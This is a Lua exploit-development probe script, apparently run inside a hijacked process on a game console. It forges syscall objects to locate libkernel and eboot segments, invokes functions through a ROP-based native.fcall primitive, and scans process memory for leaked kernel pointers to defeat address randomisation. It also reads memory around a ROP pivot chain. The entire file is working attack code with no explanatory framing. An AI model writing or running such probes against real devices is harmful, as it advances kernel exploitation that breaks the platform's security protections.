-- CRASH_CLASS: LOW
-- PROBE 88e: Use native.fcall to call sysctl directly
-- Bypass Lua wrapper to check if kernel pointers are being stripped

print("=== PROBE 88e ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- PART A: Try native.fcall to call sysctl
-- First, find the sysctl function address in libkernel
print("--- NATIVE FCALL ---")

-- Get libkernel base
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
make_syscall(593)(uint64(0x2001), uint64(info))
local lk_text_lo = to_num(memory.read_dword(info + 0x108))
local lk_text_hi = to_num(memory.read_dword(info + 0x10C))
local lk_text_size = to_num(memory.read_dword(info + 0x110))
print(string.format("libkernel text=0x%X%08X size=0x%X", lk_text_hi, lk_text_lo, lk_text_size))

-- Try native.fcall with getpid (simplest test)
print("")
print("--- FCALL GETPID ---")
-- The pipe address 0x80b5dcb57 is the syscall instruction
-- native.fcall(func_addr, arg1, arg2, ...) calls a function via ROP
-- Let's see what native.fcall signature looks like
local ok_f, ret_f = pcall(native.fcall, uint64(0), uint64(20)) -- sys_getpid = 20
print("fcall(0,20) ok=" .. tostring(ok_f) .. " ret=" .. tostring(ret_f))

-- Try fcall_with_rax if available
if native.fcall_with_rax then
    print("")
    print("--- FCALL_WITH_RAX ---")
    local ok_fa, ret_fa = pcall(native.fcall_with_rax, uint64(20))
    print("fcall_with_rax(20) ok=" .. tostring(ok_fa) .. " ret=" .. tostring(ret_fa))
end

-- PART B: Scan eboot .data with native.read_buffer (conservative 4KB)
print("")
print("--- EBOOT DATA SCAN ---")
memory.write_dword(info, 0x160)
make_syscall(593)(uint64(0), uint64(info))
local edata_lo = to_num(memory.read_dword(info + 0x118))
local edata_hi = to_num(memory.read_dword(info + 0x11C))
local edata_size = to_num(memory.read_dword(info + 0x120))
print(string.format("edata=0x%X%08X size=0x%X", edata_hi, edata_lo, edata_size))

local ekcount = 0
local scan = math.min(edata_size, 0x1000)
for off = 0, scan - 1, 8 do
    local addr = uint64(string.format("0x%X%08X", edata_hi, edata_lo + off))
    local ok2, data = pcall(native.read_buffer, addr, 8)
    if not ok2 or not data or #data < 8 then
        print(string.format("BREAK at +0x%X", off))
        break
    end
    local b1,b2,b3,b4,b5,b6,b7,b8 = data:byte(1,8)
    local lo = b1+b2*256+b3*65536+b4*16777216
    local hi = b5+b6*256+b7*65536+b8*16777216
    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
        ekcount = ekcount + 1
        print(string.format("KPTR +0x%04X: 0x%08X%08X", off, hi, lo))
    end
end
print("eboot_kptr=" .. ekcount)

-- PART C: Read the pivot_handler_rop fields around +0x5D0-0x600 where 0x80b5f0249 was
print("")
print("--- PIVOT HANDLER REGION ---")
-- pivot_handler_rop is at 0xF00000B9 based on output
-- But this seems like a fake/virtual address. Let's read the actual pivot handler data
local phr = tostring(native.pivot_handler_rop)
print("pivot_handler=" .. phr)

-- Try to extract the ropchain address
local phr_rop = phr:match("ropchain @ (0x[0-9a-fA-F]+)")
if phr_rop then
    print("pivot rop addr=" .. phr_rop)
    -- Read from 0x5C0 offset (where the interesting values were)
    local phr_addr = uint64(phr_rop)
    local phr_h, phr_l = get_hi_lo(phr_addr)
    local off_start = 0x5C0
    for off = off_start, off_start + 64, 8 do
        local a = uint64(string.format("0x%X%08X", phr_h, phr_l + off))
        local ok3, d = pcall(native.read_buffer, a, 8)
        if ok3 and d and #d >= 8 then
            local b1,b2,b3,b4,b5,b6,b7,b8 = d:byte(1,8)
            local lo = b1+b2*256+b3*65536+b4*16777216
            local hi = b5+b6*256+b7*65536+b8*16777216
            print(string.format("  +0x%03X: 0x%08X%08X", off, hi, lo))
        end
    end
end

print("=== PROBE 88e COMPLETE ===")
